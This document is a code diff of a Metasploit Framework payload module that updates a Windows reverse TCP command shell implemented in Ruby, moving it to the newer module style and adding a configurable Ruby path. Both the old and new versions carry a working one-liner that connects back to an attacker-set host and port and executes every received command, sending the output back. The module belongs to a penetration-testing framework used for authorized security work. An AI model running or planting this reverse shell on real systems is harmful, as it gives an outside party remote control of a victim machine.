@@ -1,45 +1,43 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+module MetasploitModule
+  CachedSize = 126
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-module Metasploit3
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Command Shell, Reverse TCP (via Ruby)',
+        'Description' => 'Connect back and create a command shell via Ruby',
+        'Author' => 'kris katterjohn',
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'ruby',
+        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
+      )
+    )
+    register_advanced_options(
+      [
+        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])
+      ]
+    )
+  end
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  def generate(_opts = {})
+    return super + command_string
+  end
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'        => 'Windows Command Shell, Reverse TCP (via Ruby)',
-			'Version'     => '$Revision$',
-			'Description' => 'Connect back and create a command shell via Ruby',
-			'Author'      => 'kris katterjohn',
-			'License'     => MSF_LICENSE,
-			'Platform'    => 'win',
-			'Arch'        => ARCH_CMD,
-			'Handler'     => Msf::Handler::ReverseTcp,
-			'Session'     => Msf::Sessions::CommandShell,
-			'PayloadType' => 'cmd',
-			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
-		))
-	end
-
-	def generate
-		return super + command_string
-	end
-
-	def command_string
-		"ruby -rsocket -e 'c=TCPSocket.new(\"#{datastore['LHOST']}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-	end
+  def command_string
+    "#{datastore['RubyPath']} -rsocket -e \"c=TCPSocket.new(\\\"#{datastore['LHOST']}\\\",\\\"#{datastore['LPORT']}\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end\""
+  end
 end
